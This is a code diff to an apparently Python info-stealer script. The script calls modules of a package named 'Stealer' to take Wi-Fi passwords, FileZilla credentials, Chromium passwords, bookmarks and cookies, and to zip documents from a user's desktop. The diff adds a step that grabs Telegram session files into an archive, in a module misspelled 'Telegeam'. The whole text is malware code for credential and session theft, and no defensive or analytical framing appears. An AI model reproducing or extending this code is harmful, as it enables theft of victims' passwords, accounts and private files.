@@ -4,6 +4,7 @@
 import Stealer.Wifi
 import Stealer.FileZilla
 import Stealer.Grabber
+import Stealer.Telegeam
 import Stealer.Chromium.Passwords
 import Stealer.Chromium.Bookmarks
 import Stealer.Chromium.Cookies
@@ -16,6 +17,8 @@ wifi = Stealer.Wifi.StealWifiPasswords()
 filezilla = Stealer.FileZilla.Get()
 # Grab all files from path and return .zip archive location
 archive = Stealer.Grabber.Grab(path="C:\\Users\\Admin\\Desktop", archivePath="data.zip", maxsize=5242880, extensions=["txt", "doc", "pdf", "db"])
+# Grab telegram session files and return .zip archive location
+tdata = Stealer.Telegeam.Grab(archivePath="tdata.zip")
 # Returns a list with dictionaries with your chrome passwords
 passwords = Stealer.Chromium.Passwords.Get()
 # Returns a list with dictionaries with your chrome bookmarks
